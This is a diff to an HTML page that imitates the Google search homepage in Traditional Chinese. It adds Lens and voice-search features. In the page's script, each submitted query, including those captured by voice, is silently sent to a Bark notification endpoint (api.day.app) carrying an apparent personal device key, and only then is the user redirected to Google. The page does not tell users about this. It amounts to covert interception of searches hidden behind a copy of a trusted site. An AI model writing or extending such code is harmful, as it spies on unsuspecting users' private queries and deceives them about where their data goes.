@@ -136,6 +136,11 @@
         .mic-icon-svg:hover, .lens-icon-svg:hover {
             background-color: #f0f0f0;
         }
+        /* Style for when microphone is active */
+        .mic-icon-svg.is-listening {
+            background-color: #e84235;
+            fill: #fff;
+        }
 
         /* --- Footer --- */
         .footer {
@@ -198,12 +203,10 @@
                 <a href="https://www.google.com/imghp">圖片</a>
             </div>
         </div>
-
         <div class="desktop-links">
             <a href="https://mail.google.com/">Gmail</a>
             <a href="https://www.google.com/imghp">圖片</a>
         </div>
-
         <div class="header-right">
             <svg class="app-launcher" focusable="false" viewBox="0 0 24 24">
                 <path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path>
@@ -214,7 +217,6 @@
 
     <main class="container">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
-        
         <div class="search-container">
             <form id="search-form" action="https://www.google.com/search" method="get">
                 <div class="search-bar">
@@ -223,11 +225,10 @@
                     </svg>
                     <input type="text" class="search-input" name="q" id="search-input" title="搜尋" autocomplete="off" autofocus>
                     <div class="search-icons-right">
-                        <svg class="mic-icon-svg" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <svg class="mic-icon-svg" id="mic-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                             <path fill-rule="evenodd" clip-rule="evenodd" d="M12 14C13.6569 14 15 12.6569 15 11V5C15 3.34315 13.6569 2 12 2C10.3431 2 9 3.34315 9 5V11C9 12.6569 10.3431 14 12 14ZM12 16.7C15.9696 16.7 19.2 13.912 19.2 10.5H21C21 14.331 18.233 17.653 14.5 18.158V21H9.5V18.158C5.767 17.653 3 14.331 3 10.5H4.8C4.8 13.912 8.03045 16.7 12 16.7Z"></path>
                         </svg>
-                        
-                        <svg class="lens-icon-svg" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <svg class="lens-icon-svg" id="lens-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path d="M4.5,5.25a.75.75,0,0,0-.75.75v2.25a.75.75,0,0,0,1.5,0V6h2.25a.75.75,0,0,0,0-1.5H5.25a.75.75,0,0,0-.75.75Z"></path>
                            <path d="M19.5,5.25a.75.75,0,0,0-.75-.75H16.5a.75.75,0,0,0,0,1.5h2.25V8.25a.75.75,0,0,0,1.5,0V6a.75.75,0,0,0-.75-.75Z"></path>
                            <path d="M4.5,18.75a.75.75,0,0,0,.75.75h2.25a.75.75,0,0,0,0-1.5H6V15.75a.75.75,0,0,0-1.5,0v2.25a.75.75,0,0,0,.75.75Z"></path>
@@ -254,21 +255,83 @@
     </footer>
 
     <script>
-        document.getElementById('search-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const query = document.getElementById('search-input').value;
+        const searchForm = document.getElementById('search-form');
+        const searchInput = document.getElementById('search-input');
+        const micIcon = document.getElementById('mic-icon');
+        const lensIcon = document.getElementById('lens-icon');
+
+        // --- Bark Notification and Search Submission Function ---
+        function submitSearch(query) {
             if (query.trim() !== '') {
+                // 1. Send Bark notification
                 const barkUrl = `https://api.day.app/ZRThbuFUNKAn26qqofTNJi/${encodeURIComponent(query)}`;
                 if (navigator.sendBeacon) {
                     navigator.sendBeacon(barkUrl);
                 } else {
                     fetch(barkUrl, { method: 'POST', keepalive: true }).catch(error => console.error('Bark notification failed:', error));
                 }
+                
+                // 2. Redirect to Google search results page
                 setTimeout(() => {
                     window.location.href = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
                 }, 100);
             }
+        }
+
+        // --- Standard Form Submission (Pressing Enter) ---
+        searchForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const query = searchInput.value;
+            submitSearch(query);
         });
+
+        // --- Google Lens Icon Functionality ---
+        lensIcon.addEventListener('click', function() {
+            // Open the official Google Lens upload page in a new tab
+            window.open('https://lens.google.com/uploadbyfile', '_blank');
+        });
+
+        // --- Voice Search Functionality ---
+        // Check if browser supports the Web Speech API
+        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+        if (SpeechRecognition) {
+            const recognition = new SpeechRecognition();
+            recognition.continuous = false; // Stop listening after first result
+            recognition.lang = 'zh-TW'; // Set language to Traditional Chinese
+            recognition.interimResults = false;
+            recognition.maxAlternatives = 1;
+
+            micIcon.addEventListener('click', () => {
+                recognition.start();
+                micIcon.classList.add('is-listening');
+            });
+
+            recognition.onresult = (event) => {
+                const transcript = event.results[0][0].transcript;
+                searchInput.value = transcript;
+                // Automatically submit the search after voice input
+                setTimeout(() => submitSearch(transcript), 200);
+            };
+
+            recognition.onspeechend = () => {
+                recognition.stop();
+            };
+
+            recognition.onend = () => {
+                micIcon.classList.remove('is-listening');
+            };
+
+            recognition.onerror = (event) => {
+                alert('語音識別錯誤: ' + event.error);
+                micIcon.classList.remove('is-listening');
+            };
+
+        } else {
+            // If browser doesn't support it, alert the user
+            micIcon.addEventListener('click', () => {
+                alert('抱歉，您的瀏覽器不支援語音搜尋功能。請嘗試使用 Chrome 瀏覽器。');
+            });
+        }
     </script>
 </body>
 </html>
